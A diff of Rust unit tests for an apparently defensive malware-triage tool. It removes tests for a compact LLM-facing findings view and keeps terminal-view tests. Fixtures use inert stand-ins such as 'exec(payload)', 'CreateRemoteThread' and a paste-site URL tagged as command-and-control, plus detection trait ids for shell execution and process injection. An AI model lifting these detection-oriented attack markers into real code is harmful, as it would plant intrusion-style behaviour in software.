-            &format!("notable_{i}()\n"),
-            &format!("micro-behaviors/{fam}::n{i}"),
-            Criticality::Notable,
-            0.95,
-        ));
-    }
-    context.sort_by_key(|w| w.line.loc);
-    let tiny = format_context(
-        &report_with_files(vec![story_file(context, vec![])]),
-        &capped(1),
-    );
-    assert!(
-        tiny.contains("suspicious_call("),
-        "suspicious drawn: {tiny}"
-    );
-    assert!(!tiny.contains("notable_0()"), "no notable window: {tiny}");
-}
-
-/// Within one criticality, a window from a family not yet drawn beats a
-/// slightly more confident one repeating a family already shown.
-#[test]
-fn tiny_window_pick_spreads_across_families() {
-    let context = vec![
-        story_line(
-            1,
-            "first_http(a)\n",
-            "micro-behaviors/net/http::a",
-            Criticality::Notable,
-            0.9,
-        ),
-        story_line(
-            2,
-            "again_http(b)\n",
-            "micro-behaviors/net/http::b",
-            Criticality::Notable,
-            0.85,
-        ),
-        story_line(
-            3,
-            "write_file(c)\n",
-            "micro-behaviors/fs/write::c",
-            Criticality::Notable,
-            0.8,
-        ),
-    ];
-    let tiny = format_context(
-        &report_with_files(vec![story_file(context, vec![])]),
-        &capped(2),
-    );
-    assert!(tiny.contains("first_http(a)"), "best window drawn: {tiny}");
-    assert!(tiny.contains("write_file(c)"), "new family drawn: {tiny}");
-    assert!(
-        !tiny.contains("again_http(b)"),
-        "repeat family skipped: {tiny}"
-    );
-    assert!(
-        !tiny.contains("micro-behaviors/net/http::b"),
-        "the skipped finding renders no bare note: {tiny}"
-    );
-}
-
-/// A withheld composite's leg outranks an equally graded, more confident
-/// unreferenced note — whether the leg holds its own note or was handed
-/// the composite's — yet its window carries only the leg's own label.
-#[test]
-fn tiny_window_pick_ranks_legs_by_their_withheld_composite() {
-    let leg = "objectives/command-and-control/infrastructure/paste::shz-al";
-    let comp = "objectives/command-and-control/channel/rendezvous::paste";
-    for relabeled in [false, true] {
-        let composite = Finding {
-            trait_refs: vec![leg.to_string().into()],
-            conf: 0.8,
-            ..finding_with(comp, Criticality::Suspicious)
-        };
-        let leg_finding = Finding {
-            conf: 0.7,
-            evidence: vec![Evidence::new("string", "", "shz.al").with_offset(50 * LINE_BYTES)],
-            ..finding_with(leg, Criticality::Notable)
-        };
-        let leg_line = if relabeled {
-            story_line(
-                50,
-                "PASTE = 'https://shz.al/x'\n",
-                comp,
-                Criticality::Suspicious,
-                0.8,
-            )
-        } else {
-            story_line(
-                50,
-                "PASTE = 'https://shz.al/x'\n",
-                leg,
-                Criticality::Notable,
-                0.7,
-            )
-        };
-        let other = story_line(
-            1,
-            "requests.get(url)\n",
-            "micro-behaviors/net/http::get",
-            Criticality::Notable,
-            0.95,
-        );
-        let mut file = story_file(vec![other], vec![leg_finding, composite]);
-        annotate(&mut file, vec![leg_line]);
-        let tiny = format_context(&report_with_files(vec![file]), &capped(1));
-        assert!(
-            tiny.contains("shz.al"),
-            "relabeled={relabeled}: leg drawn: {tiny}"
-        );
-        assert!(
-            !tiny.contains("requests.get(url)"),
-            "relabeled={relabeled}: unreferenced note not drawn: {tiny}"
-        );
-        assert!(
-            tiny.contains(&format!("# N 50:1 {leg}")),
-            "relabeled={relabeled}: the leg's own grade and id: {tiny}"
-        );
-        assert!(
-            !tiny.contains("rendezvous") && !tiny.contains("# S ") && !tiny.contains("# H "),
-            "relabeled={relabeled}: no composite id or grade leaks: {tiny}"
-        );
-    }
-}
-
-/// An import note no composite draws on earns no window on a budgeted
-/// file, however confident, and so no annotation either.
-#[test]
-fn tiny_window_pick_skips_metadata_only_windows() {
-    let import = "metadata/import/python/subprocess::subprocess";
-    let context = vec![
-        story_line(1, "import subprocess\n", import, Criticality::Notable, 0.95),
-        story_line(
-            10,
-            "requests.get(url)\n",
-            "micro-behaviors/net/http::get",
-            Criticality::Notable,
-            0.5,
-        ),
-        story_line(
-            20,
-            "open(p, 'w')\n",
-            "micro-behaviors/fs/write::open",
-            Criticality::Notable,
-            0.5,
-        ),
-    ];
-    let tiny = format_context(
-        &report_with_files(vec![story_file(context, vec![])]),
-        &capped(2),
-    );
-    assert!(
-        !tiny.contains("import subprocess"),
-        "import not drawn: {tiny}"
-    );
-    assert!(tiny.contains("requests.get(url)"), "behavior drawn: {tiny}");
-    assert!(tiny.contains("open(p, 'w')"), "behavior drawn: {tiny}");
-    assert!(!tiny.contains(import), "no windowless import note: {tiny}");
-}
-
-/// Equal candidates across families and tiers render identically run to
-/// run, whatever order the hash maps iterate in.
-#[test]
-fn tiny_window_pick_is_deterministic() {
-    let context: Vec<Win> = (0..40u64)
-        .map(|i| {
-            story_line(
-                i * 10 + 1,
-                &format!("call_{i}(arg)\n"),
-                &format!("micro-behaviors/f{}/g{}::t{i}", i % 5, i % 3),
-                Criticality::Notable,
-                0.8,
-            )
-        })
-        .collect();
-    let report = report_with_files(vec![story_file(context, vec![])]);
-    let first = format_context(&report, &capped(7));
-    for _ in 0..20 {
-        assert_eq!(format_context(&report, &capped(7)), first);
-    }
-}
-
-/// Composite backing propagates through nested composites: an atom two
-/// composites deep takes the outer composite's criticality, and each
-/// composite counts once.
-#[test]
-fn withheld_composite_support_propagates_through_nested_composites() {
-    let outer = Finding {
-        trait_refs: vec!["objectives/inner".to_string().into()],
-        ..finding_with("objectives/outer", Criticality::Hostile)
-    };
-    let inner = Finding {
-        trait_refs: vec!["micro/atom".to_string().into()],
-        ..finding_with("objectives/inner", Criticality::Suspicious)
-    };
-    let file = src_file(
-        0,
-        "a.py",
-        50,
-        vec![
-            outer,
-            inner,
-            finding_with("micro/atom", Criticality::Notable),
-        ],
-        vec![],
-    );
-    let got = withheld_composite_support(&file, &HashSet::new());
-    let hostile = Criticality::Hostile.rank();
-    assert_eq!(
-        got.get("micro/atom"),
-        Some(&CompositeSupport {
-            rank: hostile,
-            composites: 2
-        })
-    );
-    assert_eq!(
-        got.get("objectives/inner"),
-        Some(&CompositeSupport {
-            rank: hostile,
-            composites: 1
-        })
-    );
-    assert_eq!(got.get("objectives/outer"), None);
 }
 
 #[test]
@@ -2000,41 +983,6 @@ fn trait_family_takes_segments_below_the_namespace() {
     assert_eq!(trait_family("t/one", 3), "t/one");
 }
 
-#[test]
-fn tiny_unmatched_component_shows_single_line() {
-    // A component trait no composite drew on shows only its own line — no
-    // before/after context — even though neighbors carry real code.
-    let notable = ctx_note("cat/n::hit", Criticality::Notable, 1);
-    let comp = ctx_note("blocks/c::lone", Criticality::Component, 10);
-    let file = src_file(
-        0,
-        "/only.py",
-        50,
-        vec![
-            Finding {
-                desc: "real finding".to_string().into(),
-                ..finding_with("cat/n::hit", Criticality::Notable)
-            },
-            finding_with("blocks/c::lone", Criticality::Component),
-        ],
-        vec![
-            ctx_line(1, "anchor = notable_here()", Some(notable)),
-            ctx_line(9, "NEIGHBOR_BEFORE = setup()", None),
-            ctx_line(10, "COMPONENTLINE = import_os()", Some(comp)),
-            ctx_line(11, "NEIGHBOR_AFTER = teardown()", None),
-        ],
-    );
-    let output = format_tiny(&report_with_files(vec![file]));
-    assert!(
-        output.contains("COMPONENTLINE"),
-        "the component's own line shows\n{output}"
-    );
-    assert!(
-        !output.contains("NEIGHBOR_BEFORE") && !output.contains("NEIGHBOR_AFTER"),
-        "an unmatched component gets no surrounding context\n{output}"
-    );
-}
-
 // Window sizing by inherited composite severity — a leg rendered with its
 // stronger composite's radius — is decided at capture time now, and covered by
 // `context::tests::{textual,binary}_atomic_leg_reserves_stronger_composites_window`.
@@ -2042,355 +990,9 @@ fn tiny_unmatched_component_shows_single_line() {
 // per-line radius tests here have no rendering decision left to exercise.
 
 #[test]
-fn tiny_binary_lists_all_descriptions_ahead_of_merged_block() {
-    // The binary (ASCII-forward) interpret view's model: a single merged byte
-    // window carrying multiple traits lists *all* their descriptions ahead of
-    // the block ("here's what we detected in these bytes"), then the byte
-    // rows.
-    //
-    // Within a block they lead with the worst thing in it, and each line
-    // carries the hex offset that locates it in the rows below.
-    let data: Vec<u8> = (0u8..80).collect(); // bytes 0x41.. render as ABC… in-block
-    let file = bin_file(
-        0,
-        90,
-        vec![
-            finding_with("net/connect", Criticality::Notable),
-            finding_with("exec/shell", Criticality::Suspicious),
-        ],
-        vec![byte_unit(
-            0,
-            &data,
-            vec![
-                ctx_note("net/connect", Criticality::Notable, 20),
-                ctx_note("exec/shell", Criticality::Suspicious, 40),
-            ],
-        )],
-    );
-    let output = format_tiny(&report_with_files(vec![file]));
-
-    let s_desc = output
-        .find("exec/shell desc")
-        .expect("suspicious desc shown");
-    let n_desc = output.find("net/connect desc").expect("notable desc shown");
-    let block = output.find("ABCDEFG").expect("byte block rendered");
-    // Strongest description leads, and both precede the byte block.
-    assert!(s_desc < n_desc, "strongest description first:\n{output}");
-    assert!(
-        n_desc < block,
-        "every description precedes the block's bytes:\n{output}"
-    );
-    // Each carries the hex offset of its match — 20 and 40 decimal.
-    assert!(
-        output.contains("14 net/connect desc") && output.contains("28 exec/shell desc"),
-        "each description carries its hex match offset:\n{output}"
-    );
-}
-
-/// One captured window splits into a block per contiguous run its own
-/// annotations cover.
-///
-/// Capture merges overlapping windows, and low-tier traits this view does
-/// not list bridge them: on `/bin/ls` sixteen listed detections arrived as
-/// one 1.5 KB window, so the block held hundreds of bytes no annotation
-/// accounted for and the reader had nothing tying either lump to the other.
-/// A gap between detections must end the block.
-#[test]
-fn tiny_binary_splits_a_merged_window_into_contiguous_blocks() {
-    // 1 KB window with detections at each end and nothing between: the
-    // notable margin is ±64/128 bytes, far short of the 700-byte gap.
-    let mut data = vec![b'.'; 1024];
-    data[100..108].copy_from_slice(b"NEAR_LOW");
-    data[900..909].copy_from_slice(b"NEAR_HIGH");
-    let file = bin_file(
-        0,
-        2048,
-        vec![
-            finding_with("low/hit", Criticality::Notable),
-            finding_with("high/hit", Criticality::Notable),
-        ],
-        vec![byte_unit(
-            0,
-            &data,
-            vec![
-                ctx_note("low/hit", Criticality::Notable, 100),
-                ctx_note("high/hit", Criticality::Notable, 900),
-            ],
-        )],
-    );
-    let out = format_tiny(&report_with_files(vec![file]));
-
-    // Two blocks, each carrying only its own annotation.
-    let low_desc = out.find("low/hit desc").expect("low annotation");
-    let low_bytes = out.find("NEAR_LOW").expect("low bytes");
-    let high_desc = out.find("high/hit desc").expect("high annotation");
-    let high_bytes = out.find("NEAR_HIGH").expect("high bytes");
-    assert!(
-        low_desc < low_bytes && low_bytes < high_desc && high_desc < high_bytes,
-        "each block must follow its own annotations:\n{out}",
-    );
-
-    // The dead span between them is not rendered: every row belongs to one
-    // of the two blocks.
-    let rows: Vec<u64> = out
-        .lines()
-        .filter_map(|l| {
-            let (gutter, rest) = l.split_once(['-', ':'])?;
-            rest.starts_with(' ')
-                .then(|| u64::from_str_radix(gutter, 16).ok())
-                .flatten()
-        })
-        .collect();
-    assert!(!rows.is_empty(), "no rows rendered:\n{out}");
-    assert!(
-        rows.iter().all(|off| *off < 300 || *off > 700),
-        "the unannotated span between blocks must not be rendered: {rows:?}\n{out}",
-    );
-}
-
-/// A source chunk renders as blocks of *consecutive* lines, separated by a
-/// blank line and with no blank line of their own at either edge.
-///
-/// The renderer drops rows carrying no match and no real code, so the lines
-/// it emits from one chunk are routinely not consecutive in the file. Run
-/// together they read as one block of code that never existed; padded with
-/// the source's own blank lines they read as a bigger jump than there is.
-#[test]
-fn tiny_source_blocks_are_separated_and_edge_trimmed() {
-    use crate::types::{ContextLine, Note};
-
-    // Matches on the first and last statements, blank source lines flanking
-    // the second, and filler between that carries neither a match nor real
-    // code.
-    let src =
-        "const alpha = requireSomething();\n}\n}\n}\n\nconst beta = exfiltrateSomething();\n\n}\n";
-    let note = |id: &str, off: u64| Note {
-        crit: Criticality::Notable,
-        id: id.to_string().into(),
-        desc: format!("{id} desc").into(),
-        off,
-        len: 5,
-        conf: 0.9,
-    };
-    let beta_off = src.find("const beta").unwrap_or(0) as u64;
-    let file = src_file(
-        0,
-        "/t/sample.js",
-        90,
-        vec![
-            finding_with("a/first", Criticality::Notable),
-            finding_with("b/second", Criticality::Notable),
-        ],
-        vec![Win {
-            line: ContextLine {
-                loc: 0,
-                line: Some(1),
-                col: Some(1),
-                data: src.as_bytes().to_vec(),
-            },
-            notes: vec![note("a/first", 0), note("b/second", beta_off)],
-        }],
-    );
-    let out = format_tiny(&report_with_files(vec![file]));
-
-    // Skip the header line; the rest is the rendered body, less the
-    // document's own trailing newline.
-    let mut body: Vec<&str> = out.lines().skip(1).collect();
-    while body.last().is_some_and(|l| l.is_empty()) {
-        body.pop();
-    }
-    assert!(
-        body.iter().any(|l| l.contains("const alpha"))
-            && body.iter().any(|l| l.contains("const beta")),
-        "both matched lines render: {out:?}",
-    );
-    assert!(
-        !body.iter().any(|l| l.trim().is_empty() && !l.is_empty()),
-        "a whitespace-only row is padding, not content: {out:?}",
-    );
-    let blanks: Vec<usize> = body
-        .iter()
-        .enumerate()
-        .filter(|(_, l)| l.is_empty())
-        .map(|(i, _)| i)
-        .collect();
-    assert!(
-        blanks.windows(2).all(|w| w[1] != w[0] + 1),
-        "blocks are separated by exactly one blank line: {out:?}",
-    );
-    assert!(
-        body.first().is_some_and(|l| !l.is_empty()) && body.last().is_some_and(|l| !l.is_empty()),
-        "the body must not open or close on a blank line: {out:?}",
-    );
-}
-
-#[test]
-fn tiny_binary_separates_independent_blocks() {
-    // Two non-overlapping byte windows render as separate blocks, each with its
-    // own detection listed ahead of it, in file order.
-    let file = bin_file(
-        0,
-        90,
-        vec![
-            finding_with("first/hit", Criticality::Suspicious),
-            finding_with("second/hit", Criticality::Hostile),
-        ],
-        vec![
-            byte_unit(
-                0,
-                b"AAAAAAAAAAAAAAAA",
-                vec![ctx_note("first/hit", Criticality::Suspicious, 4)],
-            ),
-            byte_unit(
-                4096,
-                b"BBBBBBBBBBBBBBBB",
-                vec![ctx_note("second/hit", Criticality::Hostile, 4100)],
-            ),
-        ],
-    );
-    let output = format_tiny(&report_with_files(vec![file]));
-
-    let a_desc = output.find("first/hit desc").expect("block A described");
-    let a_bytes = output.find("AAAAAAAA").expect("block A bytes");
-    let b_desc = output.find("second/hit desc").expect("block B described");
-    let b_bytes = output.find("BBBBBBBB").expect("block B bytes");
-    assert!(
-        a_desc < a_bytes && a_bytes < b_desc && b_desc < b_bytes,
-        "each block's description leads its own bytes, blocks in file order:\n{output}"
-    );
-}
-
-#[test]
-fn tiny_shows_all_components_only_in_top_five_files() {
-    // An unreferenced component renders as context inside a top-five file, but
-    // a file past the cap keeps the default gating — its lone component is not
-    // resurrected as a note (it sits below the notable bare-note floor).
-    let mut files: Vec<FileAnalysis> = (0..5)
-        .map(|i| {
-            let id = format!("cat/n::f{i}");
-            let note = ctx_note(&id, Criticality::Notable, 1);
-            src_file(
-                i,
-                &format!("/top{i}.py"),
-                100 - i,
-                vec![Finding {
-                    desc: format!("top finding {i}").into(),
-                    ..finding_with(&id, Criticality::Notable)
-                }],
-                vec![ctx_line(1, &format!("TOPCODE_{i} = work()"), Some(note))],
-            )
-        })
-        .collect();
-
-    // A top-five file additionally carrying an unreferenced component.
-    let in_top = &mut files[0];
-    in_top
-        .findings
-        .push(finding_with("blocks/c::shown", Criticality::Component));
-    annotate(
-        in_top,
-        vec![ctx_line(
-            20,
-            "SHOWN_COMPONENT = side_effect()",
-            Some(ctx_note("blocks/c::shown", Criticality::Component, 20)),
-        )],
-    );
-
-    // A sixth file, past the cap, whose only extra signal is a component.
-    files.push(src_file(
-        5,
-        "/tail.py",
-        1,
-        vec![
-            Finding {
-                desc: "tail notable".to_string().into(),
-                ..finding_with("cat/n::tail", Criticality::Notable)
-            },
-            finding_with("blocks/c::hidden", Criticality::Component),
-        ],
-        vec![
-            ctx_line(
-                1,
-                "TAILCODE = work()",
-                Some(ctx_note("cat/n::tail", Criticality::Notable, 1)),
-            ),
-            ctx_line(
-                20,
-                "HIDDEN_COMPONENT = side_effect()",
-                Some(ctx_note("blocks/c::hidden", Criticality::Component, 20)),
-            ),
-        ],
-    ));
-
-    let output = format_tiny(&report_with_files(files));
-    assert!(
-        output.contains("SHOWN_COMPONENT"),
-        "a component in a top-five file renders as context\n{output}"
-    );
-    assert!(
-        !output.contains("HIDDEN_COMPONENT"),
-        "a capped file keeps default component gating\n{output}"
-    );
-}
-
-#[test]
-fn tiny_lists_no_capabilities_for_a_quiet_platform_signed_file() {
-    let runtime_identity = identity(serde_json::json!({
-        "name": {"value": "msvcp140.dll", "source": "pe.version.original_filename"},
-        "organization": {"value": "Microsoft Corporation", "source": "pe.signatures[0]", "verified": true},
-        "trust": "platform"
-    }));
-    let mut runtime = src_file(
-        0,
-        "/pkg.tgz!!bin/msvcp140.dll",
-        30,
-        vec![finding_with(
-            "micro-behaviors/fs/file::position-api",
-            Criticality::Notable,
-        )],
-        vec![ctx_line(
-            1,
-            "SetFilePointerEx",
-            Some(ctx_note(
-                "micro-behaviors/fs/file::position-api",
-                Criticality::Notable,
-                1,
-            )),
-        )],
-    );
-    runtime.identity = Some(runtime_identity.clone());
-    let tiny = format_context(&report_with_files(vec![runtime.clone()]), &TinyOpts::tiny());
-    assert!(
-        tiny.contains("msvcp140.dll"),
-        "the header still names it: {tiny}"
-    );
-    assert!(!tiny.contains("position-api"), "no capability list: {tiny}");
-
-    // Anything suspicious on a signed file is still shown.
-    annotate(
-        &mut runtime,
-        vec![ctx_line(
-            3,
-            "CreateRemoteThread",
-            Some(ctx_note(
-                "objectives/evasion/process/injection::remote-thread",
-                Criticality::Suspicious,
-                3,
-            )),
-        )],
-    );
-    let tiny = format_context(&report_with_files(vec![runtime]), &TinyOpts::tiny());
-    assert!(
-        tiny.contains("remote-thread") || tiny.contains("evasion/process"),
-        "{tiny}"
-    );
-}
-
-#[test]
-fn tiny_omits_file_gap_lines_and_directories() {
+fn terminal_keeps_file_gap_lines_with_full_paths() {
     // A per-file analysis gap is for a reader deciding whether to trust
-    // silence; the LLM view drops it. Nor does it name the directories above
-    // a sample, the operator's filing (`hostile/`, `benign/`).
+    // silence.
     let mut file = src_file(
         0,
         "/corpus/samples/hostile/x.py",
@@ -2404,11 +1006,6 @@ fn tiny_omits_file_gap_lines_and_directories() {
     );
     file.analysis_gaps = vec![crate::types::AnalysisGap::FlowGraphLimited].into();
     let report = report_with_files(vec![file]);
-
-    let tiny = format_context(&report, &TinyOpts::tiny());
-    assert!(!tiny.contains("Analysis incomplete"), "{tiny}");
-    assert!(tiny.contains("run()"), "{tiny}");
-    assert!(!tiny.contains("samples/hostile"), "{tiny}");
 
     // The terminal view keeps the gap, with the full path for the human who
     // filed it.
@@ -2607,7 +1204,7 @@ fn test_aggregate_findings_same_directory_keeps_highest_confidence() {
 }
 
 #[test]
-fn test_format_tiny_omits_location_less_finding() {
+fn terminal_lists_a_location_less_finding() {
     let findings = vec![Finding {
         precomputed_spans: None,
         src: None,
@@ -2634,13 +1231,8 @@ fn test_format_tiny_omits_location_less_finding() {
     }];
     let report = create_test_report(findings, vec![]);
 
-    let output = format_tiny(&report);
-
-    // No capture pass ran here, so the finding has no context window. The
-    // LLM view draws annotations only beside code, so the file renders
-    // nothing; the terminal view still lists it as a location-less note.
-    assert!(!output.contains("Execute shell commands"), "{output}");
-    assert!(!output.contains("sample.bin"), "{output}");
+    // No capture pass ran here, so the finding has no context window; the
+    // terminal view still lists it as a location-less note.
     let term = format_context(&report, &TinyOpts::terminal());
     assert!(term.contains("Execute shell commands"), "{term}");
 }
@@ -2656,32 +1248,13 @@ fn tiny_path_basenames_root_and_archive_relativizes_members() {
         tiny_path("/tmp/a.zip!!b.zip!!deep", true),
         "a.zip/b.zip/deep"
     );
-    // A standalone/root path is basenamed only in the LLM (tiny) view.
+    // A standalone/root path is basenamed only on request (the card layout).
     assert_eq!(tiny_path("/tmp/triage/x.bin", true), "x.bin");
     assert_eq!(tiny_path("/tmp/triage/x.bin", false), "/tmp/triage/x.bin");
 }
 
-/// The printable projection keeps strings and their boundaries, drops
-/// the byte escapes, and still collapses UTF-16 runs.
 #[test]
-fn ascii_printable_keeps_strings_and_boundaries() {
-    assert_eq!(
-        ascii_printable(b"\x00getpwuid\x00\x7f\xffsetuid"),
-        " getpwuid setuid"
-    );
-    assert_eq!(ascii_printable(b"a<b\\c"), "a<b\\c");
-    assert_eq!(ascii_printable(b"\x7fELF\x02\x01\x01"), " ELF ");
-    assert_eq!(ascii_printable(b"P\x00r\x00o\x00d\x00\x00\x00X"), "Prod X");
-    assert_eq!(ascii_printable(b"plain text"), "plain text");
-}
-
-#[test]
-fn select_ids_tiny_omits_composites_and_promotes_their_legs() {
-    // The LLM view shows evidence, not conclusions. A composite is cleave's
-    // own verdict: withheld, with the legs it was built from promoted in its
-    // place — even though those legs sit at Baseline/Component, tiers this
-    // view would otherwise drop. A component the composite does not
-    // reference stays dropped: promotion is for legs, not every fragment.
+fn select_ids_terminal_keeps_composites() {
     let mut composite = finding_with("objectives/loader::matched", Criticality::Suspicious);
     composite.trait_refs = vec![
         "micro-behaviors/fs/read::open".to_string().into(),
@@ -2694,17 +1267,8 @@ fn select_ids_tiny_omits_composites_and_promotes_their_legs() {
         composite,
     ]);
 
-    let tiny = select_ids(&file, &TinyOpts::tiny(), 0);
-    assert!(
-        !tiny.contains(&"objectives/loader::matched"),
-        "the composite's conclusion must not reach the grader: {tiny:?}"
-    );
-    assert!(tiny.contains(&"micro-behaviors/fs/read::open"), "{tiny:?}");
-    assert!(tiny.contains(&"objectives/loader::fragment"), "{tiny:?}");
-    assert!(!tiny.contains(&"objectives/loader::unused"), "{tiny:?}");
-
-    // The terminal view is unchanged: a human wants the conclusion.
-    let term = select_ids(&file, &TinyOpts::terminal(), 0);
+    // A human wants the conclusion.
+    let term = select_ids(&file, &TinyOpts::terminal());
     assert!(term.contains(&"objectives/loader::matched"), "{term:?}");
 }
 
@@ -2726,7 +1290,7 @@ fn select_ids_keeps_cross_file_composites_on_a_container() {
         }],
     );
 
-    let term = select_ids(&file, &TinyOpts::terminal(), 0);
+    let term = select_ids(&file, &TinyOpts::terminal());
     assert!(term.contains(&"objectives/impact::launch"), "{term:?}");
 
     // An ordinary inherited copy — `src` set, no composite provenance — is
@@ -2734,219 +1298,15 @@ fn select_ids_keeps_cross_file_composites_on_a_container() {
     let mut inherited = finding_with("objectives/impact::other", Criticality::Suspicious);
     inherited.src = Some(7);
     let plain = file_with_findings(vec![inherited]);
-    let term = select_ids(&plain, &TinyOpts::terminal(), 0);
+    let term = select_ids(&plain, &TinyOpts::terminal());
     assert!(!term.contains(&"objectives/impact::other"), "{term:?}");
 }
 
 #[test]
-fn test_format_tiny_merges_and_annotates_context() {
-    // A file with merged context: two findings on one line (collision) and
-    // a context line between two hits.
-    use crate::types::{ContextLine, Note};
-    let report = create_test_report(
-        vec![Finding {
-            precomputed_spans: None,
-            src: None,
-            kind: FindingKind::Capability,
-            trait_refs: vec![],
-            id: "net/socket".to_string().into(),
-            desc: "socket usage".to_string().into(),
-            conf: 0.8,
-            crit: Criticality::Notable,
-            mbc: None,
-            attack: None,
-            evidence: vec![],
-            match_count: 0,
-            source_file: None,
-            downgraded: false,
-        }],
-        vec![],
-    );
-    // Inject one byte-window chunk spanning a context line and the hit line;
-    // the renderer splits it into physical rows (the capture pass needs file
-    // bytes). Line 4 "ctx before" is bytes 40..50, then '\n', then line 5
-    // "s = socket()" at byte 51; the match's 'o' sits at byte 56 → column 6.
-    let mut report = report;
-    annotate(
-        &mut report.files[0],
-        vec![Win {
-            line: ContextLine {
-                loc: 40,
-                line: Some(4),
-                col: Some(1),
-                data: b"ctx before\ns = socket()".to_vec(),
-            },
-            notes: vec![Note {
-                crit: Criticality::Notable,
-                id: "net/socket".to_string().into(),
-                desc: "socket usage".to_string().into(),
-                off: 56,
-                len: 6,
-                conf: 0.8,
-            }],
-        }],
-    );
-    let output = format_tiny(&report);
-    // Context row: bare source, no annotation and no `LINE`/severity prefix.
-    assert!(output.contains("ctx before"));
-    assert!(!output.contains(".\t4"));
-    // Hit: a `{marker} SEV LINE:COL desc` annotation line (the description,
-    // not the trait-id leaf) immediately above the unaltered source line.
-    assert!(output.contains("// N 5:6 socket usage"));
-    assert!(output.contains("s = socket()"));
-}
-
-#[test]
-fn test_format_tiny_overlapping_notes_show_only_strongest() {
-    // Two traits matching the same span on one line. The capture pass would
-    // collapse them to the strongest (`conf × crit`) via `dedup_notes`; this
-    // guards the render layer downstream of that — even handed both notes, the
-    // LLM view announces only one finding above the (single, unaltered) source
-    // line, never stacking both halves of an overlapping pair.
-    use crate::types::{ContextLine, Note};
-    let report = create_test_report(
-        vec![
-            Finding {
-                precomputed_spans: None,
-                src: None,
-                kind: FindingKind::Capability,
-                trait_refs: vec![],
-                id: "a/strong".to_string().into(),
-                desc: "decode+exec".to_string().into(),
-                conf: 0.9,
-                crit: Criticality::Hostile,
-                mbc: None,
-                attack: None,
-                evidence: vec![],
-                match_count: 0,
-                source_file: None,
-                downgraded: false,
-            },
-            Finding {
-                precomputed_spans: None,
-                src: None,
-                kind: FindingKind::Capability,
-                trait_refs: vec![],
-                id: "b/weak".to_string().into(),
-                desc: "exec call".to_string().into(),
-                conf: 0.9,
-                crit: Criticality::Notable,
-                mbc: None,
-                attack: None,
-                evidence: vec![],
-                match_count: 0,
-                source_file: None,
-                downgraded: false,
-            },
-        ],
-        vec![],
-    );
-    let mut report = report;
-    annotate(
-        &mut report.files[0],
-        vec![Win {
-            line: ContextLine {
-                loc: 0,
-                line: Some(1),
-                col: Some(1),
-                data: b"exec(payload)".to_vec(),
-            },
-            notes: vec![
-                Note {
-                    crit: Criticality::Hostile,
-                    id: "a/strong".to_string().into(),
-                    desc: "decode+exec".to_string().into(),
-                    off: 0,
-                    len: 13,
-                    conf: 0.9,
-                },
-                Note {
-                    crit: Criticality::Notable,
-                    id: "b/weak".to_string().into(),
-                    desc: "exec call".to_string().into(),
-                    off: 0,
-                    len: 4,
-                    conf: 0.9,
-                },
-            ],
-        }],
-    );
-    let output = format_tiny(&report);
-    // Only the strongest finding is announced, above the lone source line.
-    assert!(output.contains("// H 1:1 decode+exec"), "{output:?}");
-    assert!(!output.contains("b/weak"), "{output:?}");
-    assert!(!output.contains("exec call"), "{output:?}");
-    assert!(output.contains("exec(payload)"), "{output:?}");
-}
-
-#[test]
-fn test_format_tiny_separates_non_contiguous_windows_with_blank_line() {
-    // Two hits far apart are separate windows. Without line numbers on the
-    // source rows, the LLM view must set them apart with a blank line so they
-    // don't read as one run of code; adjacent rows in the same window do not.
-    use crate::types::{ContextLine, Note};
-    let note = |id: &str, off: u64| Note {
-        crit: Criticality::Suspicious,
-        id: id.to_string().into(),
-        desc: format!("{id} desc").into(),
-        off,
-        len: 4,
-        conf: 0.9,
-    };
-    let finding = |id: &str| Finding {
-        precomputed_spans: None,
-        src: None,
-        kind: FindingKind::Capability,
-        trait_refs: vec![],
-        id: id.to_string().into(),
-        desc: format!("{id} desc").into(),
-        conf: 0.9,
-        crit: Criticality::Suspicious,
-        mbc: None,
-        attack: None,
-        evidence: vec![],
-        match_count: 0,
-        source_file: None,
-        downgraded: false,
-    };
-    let report = create_test_report(vec![finding("a/one"), finding("b/two")], vec![]);
-    let mut report = report;
-    annotate(
-        &mut report.files[0],
-        vec![
-            Win {
-                line: ContextLine {
-                    loc: 0,
-                    line: Some(5),
-                    col: Some(1),
-                    data: b"first_hit(x)\n".to_vec(),
-                },
-                notes: vec![note("a/one", 0)],
-            },
-            Win {
-                line: ContextLine {
-                    loc: 200,
-                    line: Some(50),
-                    col: Some(1),
-                    data: b"second_hit(y)\n".to_vec(),
-                },
-                notes: vec![note("b/two", 200)],
-            },
-        ],
-    );
-    let output = format_tiny(&report);
-    // The two windows are split by a blank line (source row, blank, annotation).
-    assert!(
-        output.contains("first_hit(x)\n\n// S 50:1"),
-        "windows must be blank-line separated: {output:?}"
-    );
-}
-
-#[test]
-fn test_format_tiny_does_not_resurrect_dominated_finding_location_less() {
+fn terminal_does_not_resurrect_dominated_finding_location_less() {
     // A finding that *has* a byte offset but is missing from the windows was
     // dominated by a stronger overlapping match at that span — already
-    // represented there. The LLM view must not bring it back as a location-less
+    // represented there. The view must not bring it back as a location-less
     // note (it would read as a separate, anchorless finding and duplicate what
     // shows at the offset).
     use crate::types::{ContextLine, Evidence, Note};
@@ -2995,271 +1355,8 @@ fn test_format_tiny_does_not_resurrect_dominated_finding_location_less() {
             }],
         }],
     );
-    let output = format_tiny(&report);
-    assert!(output.contains("// H 7:1 a/win desc"), "{output:?}");
-    // The tiny view draws no annotation without its code, so the dominated
-    // finding, which lost its window, is not resurrected as a bare note.
-    assert!(!output.contains("b/dominated"), "{output:?}");
-
-    // Same rule for the terminal view: a dominated finding is suppressed
-    // everywhere, never resurrected as a location-less gutter note.
+    // A dominated finding is suppressed everywhere, never resurrected as a
+    // location-less gutter note.
     let term = format_context(&report, &TinyOpts::terminal());
     assert!(!term.contains("dominated desc"), "{term:?}");
-}
-
-/// A binary window's annotations must be locatable in the bytes below them.
-///
-/// Overlapping windows merge, so one block can carry a dozen detections. The
-/// annotations used to be a positionless lump above a positionless lump of
-/// bytes — on `/bin/ls`, sixteen `// N …` lines followed by 1.5 KB of the
-/// symbol table, with nothing saying which line described which bytes. Each
-/// annotation now carries its match offset in the same hex the row gutter
-/// uses, and a row a detection matched in is marked `:` rather than `-`.
-#[test]
-fn binary_annotations_carry_offsets_that_locate_them_in_the_rows() {
-    use crate::types::{ContextLine, Note};
-
-    let note = |id: &str, off: u64| Note {
-        crit: Criticality::Notable,
-        id: id.to_string().into(),
-        desc: format!("{id} desc").into(),
-        off,
-        len: 4,
-        conf: 0.9,
-    };
-    let finding = |id: &str| Finding {
-        precomputed_spans: None,
-        src: None,
-        kind: FindingKind::Capability,
-        trait_refs: vec![],
-        id: id.to_string().into(),
-        desc: format!("{id} desc").into(),
